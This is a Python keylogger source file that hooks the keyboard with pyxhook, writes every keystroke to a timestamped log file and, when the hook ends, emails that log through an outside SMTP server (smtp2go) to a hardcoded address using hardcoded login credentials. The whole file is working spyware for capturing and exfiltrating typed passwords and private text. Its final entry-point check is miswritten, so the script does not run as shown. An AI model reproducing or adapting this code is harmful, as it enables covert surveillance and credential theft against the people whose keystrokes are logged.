import os
from datetime import datetime
import pyxhook
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText

# SMTP configuration
SMTP_SERVER = 'mail.smtp2go.com'
SMTP_PORT = 2525
SMTP_USER = 'hack_hack'
SMTP_PASSWORD = 'mahinthegay'
TO_EMAIL = '2320030263@klh.edu.in'
SUBJECT = 'Log File'

# Function to send the log file via email
def send_email(log_file):
    msg = MIMEMultipart()
    msg['From'] = SMTP_USER
    msg['To'] = TO_EMAIL
    msg['Subject'] = SUBJECT

    body = 'Please find the attached log file.'
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(log_file, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_file)}')
    msg.attach(part)

    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(SMTP_USER, SMTP_PASSWORD)
    text = msg.as_string()
    server.sendmail(SMTP_USER, TO_EMAIL, text)
    server.quit()

# main function
def main():
    # specify the name of the file (can be changed )
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    # the logging function with {event parm}
    def OnKeyPress(event):
        with open(log_file, "a") as f:  # open a file as f with Append (a) mode
            if event.Key == 'P_Enter':
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")  # write to the file / convert ascii to readable characters

    # create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

    # Send the log file via email after the hook ends
    send_email(log_file)

if name == "main":
    main()